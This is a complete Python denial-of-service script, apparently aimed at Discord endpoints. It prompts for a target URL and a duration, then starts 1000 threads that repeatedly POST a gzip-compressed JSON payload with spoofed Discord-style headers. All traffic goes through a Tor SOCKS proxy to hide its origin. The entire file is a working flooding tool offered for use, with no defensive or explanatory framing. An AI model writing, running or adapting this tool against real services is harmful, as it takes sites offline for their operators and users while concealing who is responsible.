import requests
import json
import gzip
import io
import threading
import time
import random

def get_headers():
    return {
        'Content-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0',
        'X-Discord-Locale': 'en-US',
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIn0='
    }

def flood(u, p, h, et, prx):
    s = requests.Session()
    s.proxies = prx
    while time.time() < et:
        try:
            s.post(u, data=p, headers=h, timeout=2)
        except:
            pass

def main():
    u = input("URL: ").strip()
    m = int(input("MINUTES: "))
    et = time.time() + (m * 60)
    
    data = [{"content": "SYSTEM_OVERLOAD_BYPASS_" + str(i)} for i in range(100)]
    bio = io.BytesIO()
    with gzip.GzipFile(fileobj=bio, mode='w', compresslevel=9) as f:
        f.write(json.dumps(data).encode('utf-8'))
    pkg = bio.getvalue()
    
    prx = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    
    print(f"SENDING COMPRESSED BYTES | 1000 THREADS ACTIVE")
    
    for _ in range(1000):
        t = threading.Thread(target=flood, args=(u, pkg, get_headers(), et, prx))
        t.daemon = True
        t.start()
    
    while time.time() < et:
        time.sleep(1)

if __name__ == "__main__":
    main()
  
